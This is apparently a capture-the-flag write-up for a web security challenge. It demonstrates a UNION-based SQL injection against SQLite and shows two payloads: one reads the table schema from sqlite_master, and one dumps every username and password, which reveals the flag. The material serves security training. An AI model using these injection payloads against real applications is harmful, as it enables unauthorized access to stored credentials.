---
layout: default
title: level01
---

There is a basic sql injection, here in variant of sqlite.
Let's examine the structure of the table:

- Request
> `5 Union select 1,sql FROM sqlite_master`

- Answer:
> `CREATE TABLE users(id int(7), username varchar(255), password varchar(255))`

Okay, we can see there is also column for password, let's get all passwords and usernames:

- Request
> `5 union select group_concat(username),group_concat(password) from users`
- Answer:
> `UnrelatedPassword,ExampleUserPassword,WEBSEC{Simple_SQLite_Injection}`

Yay, the FLAG is found inside the passwords

**Flag:** ***`WEBSEC{Simple_SQLite_Injection}`*** 
